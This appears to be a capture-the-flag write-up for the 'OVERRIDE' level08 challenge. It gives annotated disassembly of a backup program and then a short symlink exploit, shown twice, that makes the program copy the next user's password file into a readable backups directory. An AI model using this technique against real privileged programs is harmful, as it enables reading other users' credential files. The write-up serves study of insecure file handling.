# OVERRIDE

## level08

```sh
(gdb) disas log_wrapper
Dump of assembler code for function log_wrapper:
   0x4008c4 <+0>:     push   %rbp
   0x4008c5 <+1>:     mov    %rsp,%rbp
   0x4008c8 <+4>:     sub    $0x130,%rsp
   0x4008cf <+11>:    mov    %rdi,-0x118(%rbp)           # FILE *log
   0x4008d6 <+18>:    mov    %rsi,-0x120(%rbp)           # char *prefix
   0x4008dd <+25>:    mov    %rdx,-0x128(%rbp)           # char *filename
   0x4008e4 <+32>:    mov    %fs:0x28,%rax
   0x4008ed <+41>:    mov    %rax,-0x8(%rbp)             # canary
   0x4008f1 <+45>:    xor    %eax,%eax
                                                         # -0x110(%rbp)  char buf[264]
   0x400907 <+67>:    callq  strcpy@plt                  # strcpy(buf, prefix)
   0x400937 <+115>:   repnz scas                         # strlen(buf)
   0x400943 <+127>:   mov    $0xfe,%eax
   0x40094b <+135>:   sub    %rdx,%r8                    # n = 0xfe - strlen(prefix)
   0x400985 <+193>:   add    %rdx,%rax                   # buf + strlen
   0x400996 <+210>:   callq  snprintf@plt                # snprintf(end, n, filename)
                                                         # filename = format (pas de "%s")
   0x4009aa <+230>:   callq  strcspn@plt                 # strcspn(buf, "\n")
   0x4009af <+235>:   movb   $0x0,-0x110(%rbp,%rax,1)    # strip \n
   0x4009d5 <+273>:   callq  fprintf@plt                 # fprintf(log, "LOG: %s\n", buf)
   0x4009de <+282>:   xor    %fs:0x28,%rax
   0x4009e9 <+293>:   callq  __stack_chk_fail@plt
   0x4009ee <+298>:   leaveq
   0x4009ef <+299>:   retq
   ```

   ```sh
   (gdb) disas main
Dump of assembler code for function main:
   0x4009f0 <+0>:     push   %rbp
   0x4009f1 <+1>:     mov    %rsp,%rbp
   0x4009f4 <+4>:     sub    $0xb0,%rsp
   0x4009fb <+11>:    mov    %edi,-0x94(%rbp)            # argc
   0x400a01 <+17>:    mov    %rsi,-0xa0(%rbp)            # argv
   0x400a11 <+33>:    mov    %rax,-0x8(%rbp)             # canary
                                                         # -0x70(%rbp)  char dest[112?]
                                                         # -0x71(%rbp)  char c
                                                         # -0x78(%rbp)  int fd
                                                         # -0x80(%rbp)  FILE *src
                                                         # -0x88(%rbp)  FILE *log
   0x400a17 <+39>:    movb   $0xff,-0x71(%rbp)           # c = 0xff
   0x400a1b <+43>:    movl   $0xffffffff,-0x78(%rbp)     # fd = -1
   0x400a22 <+50>:    cmpl   $0x2,-0x94(%rbp)
   0x400a29 <+57>:    je     0x400a4a                    # if (argc != 2)
   0x400a45 <+85>:    callq  printf@plt                  # "Usage: %s filename\n"
   0x400a5a <+106>:   callq  fopen@plt                   # fopen("./backups/.log", "w")
   0x400a66 <+118>:   cmpq   $0x0,-0x88(%rbp)
   0x400a82 <+146>:   callq  printf@plt                  # "ERROR: Failed to open %s\n"
   0x400a8c <+156>:   callq  exit@plt                    # exit(1)
   0x400aae <+190>:   callq  log_wrapper                 # (log, "Starting back up: ", argv[1])
   0x400acc <+220>:   callq  fopen@plt                   # fopen(argv[1], "r")  ← suit les symlinks
   0x400afa <+266>:   callq  printf@plt                  # "ERROR: Failed to open %s\n"
   0x400b04 <+276>:   callq  exit@plt
   0x400b12 <+290>:   # memcpy dest, "./backups/", 11
   0x400b7d <+397>:   callq  strncat@plt                 # strncat(dest, argv[1], 0x63-strlen)
   0x400b86 <+406>:   mov    $0x1b0,%edx                 # mode 0660
   0x400b8b <+411>:   mov    $0xc1,%esi                  # O_WRONLY|O_CREAT|O_EXCL
   0x400b98 <+424>:   callq  open@plt                    # open(dest, ...)
   0x400ba4 <+436>:   jns    0x400bed                    # if (fd < 0) error
   0x400bc6 <+470>:   callq  printf@plt                  # "ERROR: Failed to open %s%s\n"
   0x400bd0 <+480>:   callq  exit@plt
   0x400bd5 <+485>:   callq  write@plt                   # write(fd, &c, 1)
   0x400bf5 <+517>:   callq  fgetc@plt                   # c = fgetc(src)
   0x400c03 <+531>:   jne    0x400bd5                    # while (c != EOF)
   0x400c22 <+562>:   callq  log_wrapper                 # (log, "Finished back up ", argv[1])
   0x400c2e <+574>:   callq  fclose@plt
   0x400c38 <+584>:   callq  close@plt
   0x400c3d <+589>:   mov    $0x0,%eax
   0x400c51 <+609>:   callq  __stack_chk_fail@plt
   0x400c56 <+614>:   leaveq
   0x400c57 <+615>:   retq
   ```

   The program copy the file pointed by argv[1] to ./backups/<argv[1]>

   It doesnt check for anything so the source file can be a level09 file which we should have access to

   so the exploit it pretty straight forward

```sh
ln -s /home/users/level09/.pass pwn
./level08 pwn
cat backups/pwn
```

```sh
mkdir -p /tmp/backups
cd /tmp
ln -s /home/users/level09/.pass password
/home/users/level08/level08 password
cat backups/password
```